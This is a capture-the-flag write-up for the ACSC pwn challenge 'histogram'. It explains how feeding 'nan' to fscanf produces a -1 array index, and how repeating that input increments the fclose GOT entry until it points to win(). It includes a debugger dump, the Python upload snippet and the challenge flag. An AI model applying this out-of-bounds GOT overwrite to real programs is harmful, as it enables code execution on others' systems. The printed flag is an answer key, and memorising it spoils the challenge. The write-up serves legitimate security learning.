# histogram [pwn/200]
```c
int read_data(FILE *fp) {
  /* Read data */
  double weight, height;
  int n = fscanf(fp, "%lf,%lf", &weight, &height);
  ...
  /* Validate input */
  if (weight < 1.0 || weight >= WEIGHT_MAX) fatal("Invalid weight");
  if (height < 1.0 || height >= HEIGHT_MAX) fatal("Invalid height");

  /* Store to map */
  short i, j;
  i = (short)ceil(weight / WEIGHT_STRIDE) - 1;
  j = (short)ceil(height / HEIGHT_STRIDE) - 1;

  map[i][j]++;
  wsum[i]++;
  hsum[j]++;
}
```
The important observation here is that `scanf` accepts `nan` for floats, and that `(short)ceil(nan/STRIDE)-1` evaluates to -1.

`map[-1][j]` can be used to modify the GOT table by increments. GOT functions that have _yet to be called_ will point to PLT functions, i.e. somewhere at `0x4010*`. `"nan,30\n"*520` can be used to increment the `fclose` pointer until it points to `win()`:
```python
gef➤  telescope 0x404000
0x0000000000404000│+0x0000: 0x0000000000403e10  →  0x0000000000000001
0x0000000000404008│+0x0008: 0x00007ffff7ffe190  →  0x0000000000000000
0x0000000000404010│+0x0010: 0x00007ffff7fe7bb0  →   endbr64
0x0000000000404018│+0x0018: 0x00007ffff7cfa400  →  <putchar+0> endbr64
0x0000000000404020│+0x0020: 0x00007ffff7cd7320  →  <__isoc99_fscanf+0> endbr64
0x0000000000404028│+0x0028: 0x0000000000401050  →   endbr64
0x0000000000404030│+0x0030: 0x0000000000401268  →  <win+0> endbr64
0x0000000000404038│+0x0038: 0x0000000000401070  →   endbr64
0x0000000000404040│+0x0040: 0x00007ffff7cd5e10  →  <printf+0> endbr64
0x0000000000404048│+0x0048: 0x00007ffff7cf6a90  →  <fopen64+0> endbr64
```
The web interface for this challenge is horribly broken, so I used Python's `requests` to send the bugged csv:
```python
from requests import post
with open('exploit.csv', 'rb') as f: r=post('https://histogram.chal.acsc.asia/api/histogram', files={'csv': f}, verify=False)
print(r.content)
```
`ACSC{NaN_demo_iiyo}`
